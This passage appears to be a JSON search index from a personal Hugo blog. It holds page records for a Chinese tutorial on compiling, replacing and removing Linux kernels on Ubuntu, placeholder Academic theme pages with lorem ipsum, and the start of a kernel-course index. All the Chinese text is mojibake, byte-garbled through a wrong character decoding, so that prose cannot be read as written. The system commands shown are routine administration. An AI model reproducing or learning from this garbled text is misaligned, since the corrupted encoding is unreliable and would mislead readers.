æƒ³è¦çš„ä¸ªäººä¿¡æ¯\næ–¹æ³•æœ‰è®¸å¤šï¼Œåœ¨è¿™é‡Œä»‹ç»ä¸‰ä¸ªæ–¹æ³•ï¼š\nUbuntuçš„ç™»é™†å’Œæ¬¢è¿ä¿¡æ¯æ§åˆ¶/etc/issueå’Œ/etc/motd\nå…¶ä¸­/etc/issueä¸/etc/motdåŒºåˆ«åœ¨äºï¼šå½“ä¸€ä¸ªç½‘ç»œç”¨æˆ·æˆ–é€šè¿‡ä¸²å£ç™»å½•ç³»ç»Ÿ ä¸Šæ—¶,/etc/issueçš„æ–‡ä»¶å†…å®¹æ˜¾ç¤ºåœ¨loginæç¤ºç¬¦ä¹‹å‰,è€Œ/etc/motdå†…å®¹æ˜¾ç¤ºåœ¨ç”¨æˆ·æˆåŠŸç™»å½•ç³»ç»Ÿä¹‹åã€‚ä¿®æ”¹è¿™ä¸¤ä¸ªæ–‡ä»¶éƒ½å¯ä»¥è¾¾åˆ°åŠ å…¥ä¸ªäººä¿¡æ¯çš„æ•ˆæœã€‚\nä¿®æ”¹/boot/grub/grub.cfgæ–‡ä»¶æ¥æ”¹åŠ¨æˆ‘ä»¬çš„å¼•å¯¼é¡¹çš„åå­—æ¥å®Œæˆæ˜¾ç¤ºä¸ªäººä¿¡æ¯ã€‚\nåœ¨ç¼–è¯‘ä¹‹å‰åŠ å…¥ä¸ªäººä¿¡æ¯ï¼Œå°†ä¿¡æ¯ç¼–è¯‘è¿›å†…æ ¸ï¼šå¯¹/usr/src/linux-3.6/init.cæ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼Œåœ¨æœ€åä¸€ä¸ªå‡½æ•°ä¸­ï¼ŒåŠ å…¥printkï¼ˆ\u0026quot;***\u0026quot;ï¼‰æ‰“å°æƒ³è¦çš„ä¿¡æ¯ï¼Œåœ¨è¿™é‡Œè¦æ³¨æ„æ‰“å°çš„ä¼˜å…ˆçº§ï¼Œå¿…é¡»è®¾ç½®è¶…è¿‡ä¸€å®šçš„ä¼˜å…ˆçº§æ–¹å¯åœ¨æ§åˆ¶å°æ‰“å°å‡ºæƒ³è¦çš„ä¿¡æ¯ï¼ˆå¯å‚è€ƒç›¸å…³printkå‡½æ•°çš„ä»‹ç»ï¼‰ã€‚\nå¸è½½å†…æ ¸\né¦–å…ˆæˆ‘ä»¬éœ€è¦æŸ¥çœ‹ä¸€ä¸‹å½“å‰ä½¿ç”¨çš„æ˜¯å“ªä¸ªå†…æ ¸ï¼š\nuname -r è¯¥å‘½ä»¤ä¼šå‘Šè¯‰ä½ å½“å‰ä½¿ç”¨çš„å†…æ ¸ç‰ˆæœ¬ï¼Œåœ¨ç™»å½•æ—¶å€™ï¼Œä¸èƒ½å¸è½½å½“å‰çš„å†…æ ¸ï¼Œä»¥å…é€ æˆæ— æ³•å¯åŠ¨çš„æ‚²å‰§~~\næ¥ä¸‹æ¥ï¼Œå¦‚æœä½ æ˜¯è‡ªå·±åŠ¨æ‰‹ç¼–è¯‘çš„å†…æ ¸çš„è¯ï¼Œè¯·åˆ é™¤ä»¥ä¸‹æ–‡ä»¶å’Œæ–‡ä»¶å¤¹\nåˆ é™¤æ‰/lib/modules/ç›®å½•ä¸‹è¿‡æ—¶çš„å†…æ ¸åº“æ–‡ä»¶ åˆ é™¤æ‰/usr/src/kernels/ç›®å½•ä¸‹è¿‡æ—¶çš„å†…æ ¸æºä»£ç  åˆ é™¤æ‰/bootç›®å½•ä¸‹å¯åŠ¨çš„æ ¸å¿ƒæ¡£æ¡ˆä»¥åŠå†…æ ¸æ˜ åƒ æ›´æ”¹/boot/grub/menu.lstï¼Œåˆ é™¤æ‰ä¸ç”¨çš„å¯åŠ¨åˆ—è¡¨ åœ¨è¿™é‡Œå°±åªæ¥å—è‡ªå·±åŠ¨æ‰‹ç¼–è¯‘çš„å†…æ ¸å¦‚ä½•å¸è½½äº†ï¼Œå¦‚æœæ˜¯å®‰è£…åŒ…å®‰è£…çš„å†…æ ¸ï¼Œç™¾åº¦æŸ¥è¯¢ç›¸å…³æŒ‡ä»¤å³å¯å¸è½½ï¼Œå½“ç„¶ï¼Œè‡ªå·±æ‰‹åŠ¨å¸è½½ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚\né‡è¦Linuxå†…æ ¸æ–‡ä»¶åˆ†æ .config\nä½¿ç”¨make menuconfig ç”Ÿæˆçš„å†…æ ¸é…ç½®æ–‡ä»¶ï¼Œå†³å®šå°†å†…æ ¸çš„å„ä¸ªåŠŸèƒ½ç³»ç»Ÿç¼–è¯‘è¿›å†…æ ¸è¿˜æ˜¯ç¼–è¯‘ä¸ºæ¨¡å—è¿˜æ˜¯ä¸ç¼–è¯‘ã€‚\nvmlinuzå’Œvmlinux\nvmlinuzæ˜¯å¯å¼•å¯¼çš„ã€å‹ç¼©çš„å†…æ ¸ï¼Œâ€œvmâ€ä»£è¡¨â€œVirtual Memoryâ€ã€‚Linux æ”¯æŒè™šæ‹Ÿå†…å­˜ï¼Œä¸åƒè€çš„æ“ä½œç³»ç»Ÿæ¯”å¦‚DOSæœ‰640KBå†…å­˜çš„é™åˆ¶ï¼ŒLinuxèƒ½å¤Ÿä½¿ç”¨ç¡¬ç›˜ç©ºé—´ä½œä¸ºè™šæ‹Ÿå†…å­˜ï¼Œå› æ­¤å¾—åâ€œvmâ€ã€‚vmlinuzæ˜¯å¯æ‰§è¡Œçš„Linuxå†…æ ¸ï¼Œä½äº/boot/vmlinuz\nvmlinuzçš„å»ºç«‹æœ‰ä¸¤ç§æ–¹å¼ï¼š\nç¼–è¯‘å†…æ ¸æ—¶é€šè¿‡â€œmake zImageâ€åˆ›å»ºï¼Œç„¶åé€šè¿‡ï¼šâ€œcp /usr/src/linux-2.4/arch/i386/linux/boot/zImage /boot/vmlinuzâ€äº§ç”ŸzImageé€‚ç”¨äºå°å†…æ ¸çš„æƒ…å†µï¼Œå®ƒçš„å­˜åœ¨æ˜¯ä¸ºäº†å‘åçš„å…¼å®¹æ€§ï¼›\nå†…æ ¸ç¼–è¯‘æ—¶é€šè¿‡å‘½ä»¤make bzImageåˆ›å»ºï¼ŒbzImageæ˜¯å‹ç¼©çš„å†…æ ¸æ˜ åƒï¼Œéœ€è¦æ³¨æ„ï¼ŒbzImageä¸æ˜¯ç”¨bzip2å‹ç¼©çš„ï¼ŒbzImageä¸­çš„bzå®¹æ˜“å¼•èµ·è¯¯è§£ï¼Œbzè¡¨ç¤ºâ€œbig zImageâ€ï¼ŒbzImageä¸­çš„bæ˜¯â€œbigâ€æ„æ€ã€‚ zImageï¼ˆvmlinuzï¼‰å’ŒbzImageï¼ˆvmlinuzï¼‰éƒ½æ˜¯ç”¨gzipå‹ç¼©çš„ã€‚å®ƒä»¬ä¸ä»…æ˜¯ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œè€Œä¸”åœ¨è¿™ä¸¤ä¸ªæ–‡ä»¶çš„å¼€å¤´éƒ¨åˆ†å†…åµŒæœ‰gzipè§£å‹ç¼©ä»£ç ï¼Œæ‰€ä»¥ä½ ä¸èƒ½ç”¨gunzip æˆ– gzip â€“dcè§£åŒ…vmlinuzã€‚å†…æ ¸æ–‡ä»¶ä¸­åŒ…å«ä¸€ä¸ªå¾®å‹çš„gzipç”¨äºè§£å‹ç¼©å†…æ ¸å¹¶å¼•å¯¼å®ƒã€‚ä¸¤è€…çš„ä¸åŒä¹‹å¤„åœ¨äºï¼Œè€çš„zImageè§£å‹ç¼©å†…æ ¸åˆ°ä½ç«¯å†…å­˜ï¼ˆç¬¬ä¸€ä¸ª640Kï¼‰ï¼ŒbzImageè§£å‹ç¼©å†…æ ¸åˆ°é«˜ç«¯å†…å­˜ï¼ˆ1Mä»¥ä¸Šï¼‰ã€‚å¦‚æœå†…æ ¸æ¯”è¾ƒå°ï¼Œé‚£ä¹ˆå¯ä»¥é‡‡ç”¨zImage æˆ–bzImageä¹‹ä¸€ï¼Œä¸¤ç§æ–¹å¼å¼•å¯¼çš„ç³»ç»Ÿè¿è¡Œæ—¶æ˜¯ç›¸åŒçš„ã€‚å¤§çš„å†…æ ¸é‡‡ç”¨bzImageï¼Œä¸èƒ½é‡‡ç”¨zImageã€‚\nvmlinuxæ˜¯æœªå‹ç¼©çš„å†…æ ¸ï¼Œvmlinuzæ˜¯vmlinuxçš„å‹ç¼©æ–‡ä»¶ã€‚\ninitrd.img\ninitrdæ˜¯â€œinitial ramdiskâ€çš„ç®€å†™ã€‚initrdä¸€èˆ¬è¢«ç”¨æ¥ä¸´æ—¶çš„å¼•å¯¼ç¡¬ä»¶åˆ°å®é™…å†…æ ¸vmlinuzèƒ½å¤Ÿæ¥ç®¡å¹¶ç»§ç»­å¼•å¯¼çš„çŠ¶æ€ã€‚æ¯”å¦‚initrd- 2.4.7-10.imgä¸»è¦æ˜¯ç”¨äºåŠ è½½ext3ç­‰æ–‡ä»¶ç³»ç»ŸåŠscsiè®¾å¤‡çš„é©±åŠ¨ã€‚å¦‚æœä½ ä½¿ç”¨çš„æ˜¯scsiç¡¬ç›˜ï¼Œè€Œå†…æ ¸vmlinuzä¸­å¹¶æ²¡æœ‰è¿™ä¸ª scsiç¡¬ä»¶çš„é©±åŠ¨ï¼Œé‚£ä¹ˆåœ¨è£…å…¥scsiæ¨¡å—ä¹‹å‰ï¼Œå†…æ ¸ä¸èƒ½åŠ è½½æ ¹æ–‡ä»¶ç³»ç»Ÿï¼Œä½†scsiæ¨¡å—å­˜å‚¨åœ¨æ ¹æ–‡ä»¶ç³»ç»Ÿçš„/lib/modulesä¸‹ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥å¼•å¯¼ä¸€ä¸ªèƒ½å¤Ÿè¯»å®é™…å†…æ ¸çš„initrdå†…æ ¸å¹¶ç”¨initrdä¿®æ­£scsiå¼•å¯¼é—®é¢˜ï¼Œinitrd-2.2.39.imgæ˜¯ç”¨gzipå‹ç¼©çš„æ–‡ä»¶ã€‚initrdæ˜ è±¡æ–‡ä»¶æ˜¯ä½¿ç”¨mkinitrdåˆ›å»ºçš„ï¼Œmkinitrdå®ç”¨ç¨‹åºèƒ½å¤Ÿåˆ›å»ºinitrdæ˜ è±¡æ–‡ä»¶ï¼Œè¿™ä¸ªå‘½ä»¤æ˜¯RedHatä¸“æœ‰çš„ï¼Œå…¶å®ƒLinuxå‘è¡Œç‰ˆæˆ–è®¸æœ‰ç›¸åº”çš„å‘½ä»¤ã€‚è¿™æ˜¯ä¸ªå¾ˆæ–¹ä¾¿çš„å®ç”¨ç¨‹åºã€‚å…·ä½“æƒ…å†µè¯·çœ‹å¸®åŠ©ï¼šman mkinitrd\nSystem.map\nSystem.mapæ˜¯ä¸€ä¸ªç‰¹å®šå†…æ ¸çš„å†…æ ¸ç¬¦å·è¡¨ï¼Œç”±â€œnm vmlinuxâ€äº§ç”Ÿå¹¶ä¸”ä¸ç›¸å…³çš„ç¬¦å·è¢«æ»¤å‡ºã€‚\nå‡ ä¸ªé‡è¦çš„å†…æ ¸æ–‡ä»¶åˆ†æ\narchå­ç›®å½•åŒ…æ‹¬äº†æ‰€æœ‰å’Œä½“ç³»ç»“æ„ç›¸å…³çš„æ ¸å¿ƒä»£ç ã€‚å®ƒçš„æ¯ä¸€ä¸ªå­ç›®å½•éƒ½ä»£è¡¨ä¸€ç§æ”¯æŒçš„ä½“ç³»ç»“æ„ï¼Œä¾‹å¦‚i386å°±æ˜¯å…³äºintel cpuåŠä¸ä¹‹ç›¸å…¼å®¹ä½“ç³»ç»“æ„çš„å­ç›®å½•ã€‚PCæœºä¸€èˆ¬éƒ½åŸºäºæ­¤ç›®å½•ï¼›\nincludeå­ç›®å½•åŒ…æ‹¬ç¼–è¯‘æ ¸å¿ƒæ‰€éœ€è¦çš„å¤§éƒ¨åˆ†å¤´æ–‡ä»¶ã€‚ä¸å¹³å°æ— å…³çš„å¤´æ–‡ä»¶åœ¨include/linuxå­ç›®å½•ä¸‹ï¼Œä¸intel cpuç›¸å…³çš„å¤´æ–‡ä»¶åœ¨include/asm-i386å­ç›®å½•ä¸‹,è€Œinclude/scsiç›®å½•åˆ™æ˜¯æœ‰å…³scsiè®¾å¤‡çš„å¤´æ–‡ä»¶ç›®å½•ï¼›\ninitå­ç›®å½•åŒ…å«æ ¸å¿ƒçš„åˆå§‹åŒ–ä»£ç (æ³¨ï¼šä¸æ˜¯ç³»ç»Ÿçš„å¼•å¯¼ä»£ç )ï¼ŒåŒ…å«çš„ä¸¤ä¸ªæ–‡ä»¶main.cå’ŒVersion.cï¼Œè¿™æ˜¯ç ”ç©¶æ ¸å¿ƒå¦‚ä½•å·¥ä½œçš„ä¸€ä¸ªéå¸¸å¥½çš„èµ·ç‚¹ã€‚\nMmå­ç›®å½•åŒ…æ‹¬æ‰€æœ‰ç‹¬ç«‹äºcpuä½“ç³»ç»“æ„çš„å†…å­˜ç®¡ç†ä»£ç ï¼Œå¦‚é¡µå¼å­˜å‚¨ç®¡ç†å†…å­˜çš„åˆ†é…å’Œé‡Šæ”¾ç­‰ï¼›è€Œå’Œä½“ç³»ç»“æ„ç›¸å…³çš„å†…å­˜ç®¡ç†ä»£ç åˆ™ä½äºarch/*/mm/ï¼Œä¾‹å¦‚arch/i386/mm/Fault.c\nKernelå­ç›®å½•åŒ…æ‹¬ä¸»è¦çš„æ ¸å¿ƒä»£ç ï¼Œæ­¤ç›®å½•ä¸‹çš„æ–‡ä»¶å®ç°äº†å¤§å¤šæ•°linuxç³»ç»Ÿçš„å†…æ ¸å‡½æ•°ï¼Œå…¶ä¸­æœ€é‡è¦çš„æ–‡ä»¶å½“å±sched.cï¼›åŒæ ·ï¼Œå’Œä½“ç³»ç»“æ„ç›¸å…³çš„ä»£ç åœ¨arch/*/kernelä¸­ï¼›\nDriverså­ç›®å½•æ”¾ç½®ç³»ç»Ÿæ‰€æœ‰çš„è®¾å¤‡é©±åŠ¨ç¨‹åºï¼›æ¯ç§é©±åŠ¨ç¨‹åºåˆå„å ç”¨ä¸€ä¸ªå­ç›®å½•ï¼šå¦‚ï¼Œ/blockä¸‹ä¸ºå—è®¾å¤‡é©±åŠ¨ç¨‹åºï¼Œæ¯”å¦‚ideï¼ˆide.cï¼‰ã€‚å¦‚æœä½ å¸Œæœ›æŸ¥çœ‹æ‰€æœ‰å¯èƒ½åŒ…å«æ–‡ä»¶ç³»ç»Ÿçš„è®¾å¤‡æ˜¯å¦‚ä½•åˆå§‹åŒ–çš„ï¼Œä½ å¯ä»¥çœ‹drivers/block/genhd.cä¸­çš„device_setup()ã€‚å®ƒä¸ä»…åˆå§‹åŒ–ç¡¬ç›˜ï¼Œä¹Ÿåˆå§‹åŒ–ç½‘ç»œï¼Œå› ä¸ºå®‰è£…nfsæ–‡ä»¶ç³»ç»Ÿçš„æ—¶å€™éœ€è¦ç½‘ç»œï¼›\nå…¶ä»–å­ç›®å½•ï¼š\nLibæ”¾ç½®æ ¸å¿ƒçš„åº“ä»£ç ï¼›Net,æ ¸å¿ƒä¸ç½‘ç»œç›¸å…³çš„ä»£ç ï¼›Ipc,è¿™ä¸ªç›®å½•åŒ…å«æ ¸å¿ƒçš„è¿›ç¨‹é—´é€šè®¯çš„ä»£ç ï¼›\nFs,æ‰€æœ‰çš„æ–‡ä»¶ç³»ç»Ÿä»£ç å’Œå„ç§ç±»å‹çš„æ–‡ä»¶æ“ä½œä»£ç ï¼Œå®ƒçš„æ¯ä¸€ä¸ªå­ç›®å½•æ”¯æŒä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œä¾‹å¦‚fatå’Œext2ï¼›Scripts,æ­¤ç›®å½•åŒ…å«ç”¨äºé…ç½®æ ¸å¿ƒçš„è„šæœ¬æ–‡ä»¶ç­‰ã€‚ä¸€èˆ¬ï¼Œåœ¨æ¯ä¸ªç›®å½•ä¸‹ï¼Œéƒ½æœ‰ä¸€ä¸ª.dependæ–‡ä»¶å’Œä¸€ä¸ªMakefileæ–‡ä»¶ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶éƒ½æ˜¯ç¼–è¯‘æ—¶ä½¿ç”¨çš„è¾…åŠ©æ–‡ä»¶ï¼Œä»”ç»†é˜…è¯»è¿™ä¸¤ä¸ªæ–‡ä»¶å¯¹å¼„æ¸…å„ä¸ªæ–‡ä»¶è¿™é—´çš„è”ç³»å’Œä¾æ‰˜å…³ç³»å¾ˆæœ‰å¸®åŠ©ï¼›è€Œä¸”ï¼Œåœ¨æœ‰çš„ç›®å½•ä¸‹è¿˜æœ‰Readmeæ–‡ä»¶ï¼Œå®ƒæ˜¯å¯¹è¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶çš„ä¸€äº›è¯´æ˜ï¼ŒåŒæ ·æœ‰åˆ©äºæˆ‘ä»¬å¯¹å†…æ ¸æºç çš„ç†è§£ã€‚\né‡åˆ°çš„é—®é¢˜ 1.æºçš„é—®é¢˜\nå®‰è£…å¿…å¤‡è½¯ä»¶ç¼–è¯‘å·¥å…·:#apt-get installlibncurses5-dev build-essential kernel-package çš„æ—¶å€™ï¼Œæ— æ³•æ›´æ–°ï¼Œè¾“å…¥#sudo apt-get updateä¹Ÿæ— æ³•æ›´æ–°æ•°æ®ã€‚\nåœ¨è¿™é‡Œæ˜¯ç”±äºubuntu10.10çš„æºå‡ºç°é—®é¢˜ï¼Œå¯¼è‡´æ— æ³•æ›´æ–°ã€ä¸‹è½½è½¯ä»¶ï¼Œè¿™é‡Œéœ€è¦é‡æ–°ä¿®æ”¹æºæ–‡ä»¶ã€‚å¤„ç†å¦‚ä¸‹ï¼š\nhttp://www.cnblogs.com/linuxcat/archive/2012/12/29/2839216.html\nå‚è€ƒè¯¥ç½‘ç«™å†…å®¹åï¼Œå°†æºæ¢ä¸ºhttp://old-releases.ubuntu.com/ubuntu/åœ°å€ï¼Œå³å¯æ›´æ–°ã€ä¸‹è½½è½¯ä»¶ï¼ˆå½“ç„¶ï¼Œå…¶ä»–å¯ç”¨çš„æºåœ°å€ä¹Ÿæ˜¯å¯ä»¥çš„ï¼‰ã€‚\n2.æƒé™é—®é¢˜\nåœ¨è¿™ä¸ªå†…æ ¸çš„ç¼–è¯‘ã€å®‰è£…è¿‡ç¨‹ä¸­ï¼Œæ¶‰åŠåˆ°çš„æ“ä½œéƒ½æ˜¯éœ€è¦rootæƒé™æ‰èƒ½è¿›è¡Œæ“ä½œçš„ï¼Œå¦‚æœæƒé™ä¸å¤Ÿï¼Œåˆ™äº§ç”Ÿé”™è¯¯ã€‚å¤„ç†æ–¹æ³•ï¼šä½¿ç”¨sudo(å¿…é¡»ç»™äº†ç»™ç”¨æˆ·ç”³è¯·rootçš„æƒé™)æˆ–è€…ç›´æ¥su rootåˆ‡æ¢åˆ°rootç”¨æˆ·ä¸‹è¿›è¡Œæ•´ä¸ªè¿‡ç¨‹æ“ä½œã€‚\n","date":1462626267,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1462626267,"objectID":"debb187b9e7cd17ebccecf8a1a44ed13","permalink":"http://www.guozet.me/post/Linux-kernel-update/","publishdate":"2016-05-07T13:04:27Z","relpermalink":"/post/Linux-kernel-update/","section":"post","summary":"ä¸€ç›´æƒ³å°†è‡ªå·±çš„linuxå†…æ ¸æ›´æ¢ä¸€ä¸‹ï¼Œæ¢ä¸€ä¸ªä½ç‰ˆæœ¬çš„æ–¹ä¾¿å¹³æ—¶åšå®éªŒè¯¾ç¨‹çš„æ—¶å€™ä½¿ç”¨ï¼Œäºæ˜¯å°±å¼€å§‹äº†Ubuntuä¸‹æ¢å†…æ ¸çš„è¿‡ç¨‹ï¼\n","tags":"Linux kernel","title":"Ubuntuç¼–è¯‘ã€æ›´æ¢ã€åˆ é™¤å†…æ ¸","type":"post"},{"authors":null,"categories":null,"content":"","date":1461715200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1461715200,"objectID":"d1311ddf745551c9e117aa4bb7e28516","permalink":"http://www.guozet.me/project/external-project/","publishdate":"2016-04-27T00:00:00Z","relpermalink":"/project/external-project/","section":"project","summary":"An example of linking directly to an external project website using `external_link`.","tags":["Demo"],"title":"External Project","type":"project"},{"authors":null,"categories":null,"content":"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum. Sed ac faucibus dolor, scelerisque sollicitudin nisi. Cras purus urna, suscipit quis sapien eu, pulvinar tempor diam. Quisque risus orci, mollis id ante sit amet, gravida egestas nisl. Sed ac tempus magna. Proin in dui enim. Donec condimentum, sem id dapibus fringilla, tellus enim condimentum arcu, nec volutpat est felis vel metus. Vestibulum sit amet erat at nulla eleifend gravida.\nNullam vel molestie justo. Curabitur vitae efficitur leo. In hac habitasse platea dictumst. Sed pulvinar mauris dui, eget varius purus congue ac. Nulla euismod, lorem vel elementum dapibus, nunc justo porta mi, sed tempus est est vel tellus. Nam et enim eleifend, laoreet sem sit amet, elementum sem. Morbi ut leo congue, maximus velit ut, finibus arcu. In et libero cursus, rutrum risus non, molestie leo. Nullam congue quam et volutpat malesuada. Sed risus tortor, pulvinar et dictum nec, sodales non mi. Phasellus lacinia commodo laoreet. Nam mollis, erat in feugiat consectetur, purus eros egestas tellus, in auctor urna odio at nibh. Mauris imperdiet nisi ac magna convallis, at rhoncus ligula cursus.\nCras aliquam rhoncus ipsum, in hendrerit nunc mattis vitae. Duis vitae efficitur metus, ac tempus leo. Cras nec fringilla lacus. Quisque sit amet risus at ipsum pharetra commodo. Sed aliquam mauris at consequat eleifend. Praesent porta, augue sed viverra bibendum, neque ante euismod ante, in vehicula justo lorem ac eros. Suspendisse augue libero, venenatis eget tincidunt ut, malesuada at lorem. Donec vitae bibendum arcu. Aenean maximus nulla non pretium iaculis. Quisque imperdiet, nulla in pulvinar aliquet, velit quam ultrices quam, sit amet fringilla leo sem vel nunc. Mauris in lacinia lacus.\nSuspendisse a tincidunt lacus. Curabitur at urna sagittis, dictum ante sit amet, euismod magna. Sed rutrum massa id tortor commodo, vitae elementum turpis tempus. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean purus turpis, venenatis a ullamcorper nec, tincidunt et massa. Integer posuere quam rutrum arcu vehicula imperdiet. Mauris ullamcorper quam vitae purus congue, quis euismod magna eleifend. Vestibulum semper vel augue eget tincidunt. Fusce eget justo sodales, dapibus odio eu, ultrices lorem. Duis condimentum lorem id eros commodo, in facilisis mauris scelerisque. Morbi sed auctor leo. Nullam volutpat a lacus quis pharetra. Nulla congue rutrum magna a ornare.\nAliquam in turpis accumsan, malesuada nibh ut, hendrerit justo. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Quisque sed erat nec justo posuere suscipit. Donec ut efficitur arcu, in malesuada neque. Nunc dignissim nisl massa, id vulputate nunc pretium nec. Quisque eget urna in risus suscipit ultricies. Pellentesque odio odio, tincidunt in eleifend sed, posuere a diam. Nam gravida nisl convallis semper elementum. Morbi vitae felis faucibus, vulputate orci placerat, aliquet nisi. Aliquam erat volutpat. Maecenas sagittis pulvinar purus, sed porta quam laoreet at.\n","date":1461715200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1461715200,"objectID":"8f66d660a9a2edc2d08e68cc30f701f7","permalink":"http://www.guozet.me/project/internal-project/","publishdate":"2016-04-27T00:00:00Z","relpermalink":"/project/internal-project/","section":"project","summary":"An example of using the in-built project page.","tags":["Deep Learning"],"title":"Internal Project","type":"project"},{"authors":["Terry Tang","å³æ©é”"],"categories":["Demo","æ•™ç¨‹"],"content":"Create a free website with Academic using Markdown, Jupyter, or RStudio. Choose a beautiful color theme and build anything with the Page Builder - over 40 widgets, themes, and language packs included!\nCheck out the latest demo of what you\u0026rsquo;ll get in less than 10 minutes, or view the showcase of personal, project, and business sites.\nğŸ‘‰ Get Started ğŸ“š View the documentation ğŸ’¬ Ask a question on the forum ğŸ‘¥ Chat with the community ğŸ¦ Twitter: @source_themes @GeorgeCushen #MadeWithAcademic ğŸ’¡ Request a feature or report a bug â¬†ï¸ Updating? View the Update Guide and Release Notes \u0026#x2764;\u0026#xfe0f; Support development of Academic: â˜•ï¸ Donate a coffee ğŸ’µ Become a backer on Patreon ğŸ–¼ï¸ Decorate your laptop or journal with an Academic sticker ğŸ‘• Wear the T-shirt \u0026#x1f469;\u0026zwj;\u0026#x1f4bb; Contribute Academic is mobile first with a responsive design to ensure that your site looks stunning on every device. Key features:\nPage builder - Create anything with widgets and elements Edit any type of content - Blog posts, publications, talks, slides, projects, and more! Create content in Markdown, Jupyter, or RStudio Plugin System - Fully customizable color and font themes Display Code and Math - Code highlighting and LaTeX math supported Integrations - Google Analytics, Disqus commenting, Maps, Contact Forms, and more! Beautiful Site - Simple and refreshing one page design Industry-Leading SEO - Help get your website found on search engines and social media Media Galleries - Display your images and videos with captions in a customizable gallery Mobile Friendly - Look amazing on every screen with a mobile friendly version of your site Multi-language - 15+ language packs including English, ä¸­æ–‡, and PortuguÃªs Multi-user - Each author gets their own profile page Privacy Pack - Assists with GDPR Stand Out - Bring your site to life with animation, parallax backgrounds, and scroll effects One-Click Deployment - No servers. No databases. Only files. Themes Academic comes with automatic day (light) and night (dark) mode built-in. Alternatively, visitors can choose their preferred mode - click the sun/moon icon in the top right of the Demo to see it in action! Day/night mode can also be disabled by the site admin in params.toml.\nChoose a stunning theme and font for your site. Themes are fully customizable.\nEcosystem Academic Admin: An admin tool to import publications from BibTeX or import assets for an offline site Academic Scripts: Scripts to help migrate content to new versions of Academic Install You can choose from one of the following four methods to install:\none-click install using your web browser (recommended) install on your computer using Git with the Command Prompt/Terminal app install on your computer by downloading the ZIP files install on your computer with RStudio Then personalize and deploy your new site.\nUpdating View the Update Guide.\nFeel free to star the project on Github to help keep track of updates.\nLicense Copyright 2016-present George Cushen.\nReleased under the MIT license.\n","date":1461110400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1555459200,"objectID":"279b9966ca9cf3121ce924dca452bb1c","permalink":"http://www.guozet.me/post/getting-started/","publishdate":"2016-04-20T00:00:00Z","relpermalink":"/post/getting-started/","section":"post","summary":"Create a beautifully simple website in under 10 minutes.","tags":["Academic","å¼€æº"],"title":"Academic: the website builder for Hugo","type":"post"},{"authors":null,"categories":"Linux","content":" å”å›½æ³½ åŸåˆ›ä½œå“è½¬è½½è¯·æ³¨æ˜å‡ºå¤„.\nã€ŠLinuxå†…æ ¸åˆ†æã€‹MOOCè¯¾ç¨‹\nå­¦ä¹ ç›®å½•ç´¢å¼• Linuxå†…æ ¸åˆ†æå­¦ä¹ åšå®¢æ•´ç†ï¼š\nLinuxå†…æ ¸åˆ†æè¯¾ç¨‹1_è®¡ç®—æœºæ˜¯å¦‚ä½•å·¥ä½œçš„\nè®¡ç®—æœºçš„å·¥ä½œè¿‡ç¨‹ï¼Œä¸€è¨€ä»¥è”½ä¹‹ï¼šæ‰§è¡Œç¨‹åºçš„è¿‡ç¨‹ï¼›æ‰€ä»¥åˆ†æè®¡ç®—æœºçš„å·¥ä½œåŸç†ä¹Ÿå°±æ˜¯åˆ†æè®¡ç®—æœºå­˜å‚¨ç¨‹åºï¼Œæ‰§è¡Œç¨‹åºçš„åŸç†ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬å°±éœ€è¦å…ˆé€šè¿‡äº†è§£ç¨‹åºå­˜å‚¨çš„è¿™ä¸ªè¿‡ç¨‹ã€‚\nè¿™ç¯‡åšå®¢ä¸»è¦åˆ†æäº†è®¡ç®—æœºçš„ç»„æˆå’Œè®¡ç®—æœºçš„å·¥ä½œåŸç†ï¼Œå¹¶ä¾‹ä¸¾Cè¯­è¨€å’Œæ±‡ç¼–çš„è½¬åŒ–ï¼Œæœ€åç»™å‡ºäº†ç¨‹åºæ‰§è¡Œæ—¶å€™å †æ ˆå˜åŒ–çš„åŠ¨æ€ç¤ºæ„å›¾.\nLinuxå†…æ ¸åˆ†æè¯¾ç¨‹2_æ“ä½œç³»ç»Ÿæ˜¯å¦‚ä½•å·¥ä½œçš„\næ“ä½œç³»ç»Ÿçš„å·¥ä½œåŸç†ï¼Œå¯ä»¥è¯´æ˜¯è®¡ç®—æœºå·¥ä½œåŸç†çš„ç¬¬äºŒéƒ¨åˆ†ï¼šç¨‹åºæ§åˆ¶çš„è¿‡ç¨‹ï¼Œç¨‹åºæ§åˆ¶çš„ä½“ç°æœ‰ä¸­æ–­ï¼Œç³»ç»Ÿè°ƒç”¨ï¼Œè¿›ç¨‹è°ƒåº¦ç­‰ã€‚\nåšå®¢ä¸­ä¸»è¦åˆ†æäº†æ“ä½œç³»ç»Ÿçš„å·¥ä½œè¿‡ç¨‹ï¼Œç”¨äº†ä¸€ä¸ªæ—¶é—´ä¸­æ–­å‡½æ•°æ¥æ¨¡æ‹Ÿäº†ä¸­æ–­ç¨‹åºæ‰§è¡Œçš„è¿‡ç¨‹ï¼Œå¹¶ç»™å‡ºäº†ç›¸åº”çš„å †æ ˆå˜åŒ–ç¤ºæ„å›¾ã€‚\nLinuxå†…æ ¸åˆ†æè¯¾ç¨‹3_start_kernel()å‡½æ•°åˆ†æ\nstart_kernel()è¿™ä¸ªå‡½æ•°æ˜¯å†…æ ¸ç”±å¼•å¯¼ç¨‹åºå¼•å¯¼ä»¥åï¼Œç”±è‡ªè§£å‹ç¨‹åºè§£å‹ä»¥åæ‰§è¡Œçš„ç¬¬ä¸€ä¸ªå‡½æ•°ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯æ•´ä¸ªå†…æ ¸çš„å…¥å£å‡½æ•°ï¼Œstart_kernel()åšçš„å·¥ä½œå°±æ˜¯çº¿æ€§çš„åˆå§‹åŒ–ä¸€äº›å†…æ 